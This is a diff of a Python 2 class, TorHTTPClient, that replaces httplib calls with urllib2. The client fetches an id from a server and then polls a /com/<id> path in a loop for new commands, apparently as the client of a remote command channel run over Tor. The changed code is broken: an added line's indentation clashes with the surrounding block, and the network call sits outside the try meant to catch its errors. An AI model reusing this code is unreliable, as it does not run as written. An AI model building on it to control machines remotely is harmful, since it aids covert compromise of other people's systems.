@@ -25,9 +25,7 @@ class TorHTTPClient(HTTPClient):
         self.__address = (ip, port)        
 
     def connect(self):
-        conn = httplib.HTTPConnection(self.__address[0], self.__address[1])
-        conn.request("GET", "/com/getid")
-        response = conn.getresponse()
+        response = urllib2.urlopen("http://{0}:{1}/com/getid".format(self.__address[0], self.__address[1]))
         self.__id = response.read()
         print self.__id
     
@@ -51,11 +49,9 @@ class TorHTTPClient(HTTPClient):
     
     def __fetchCommand(self):        
         while True:
-            conn = httplib.HTTPConnection(self.__address[0], self.__address[1])
-            conn.request("GET", "/com/"+self.__id)             
-            response = conn.getresponse()
-            
-            if response.status == 200:
+           response = urllib2.urlopen("http://{0}:{1}/com/{2}".format(self.__address[0], self.__address[1], self.__id))
+
+            try: 
                 data = response.read()
                 data = data.split('\n')
 
@@ -68,7 +64,7 @@ class TorHTTPClient(HTTPClient):
                         self.__lastCmd.append(data[1])
                         self.__isNewCmd = True
                         return
-            else:
+            except URLError, e:
                 return
             sleep(self.CHECK_TIME)
     
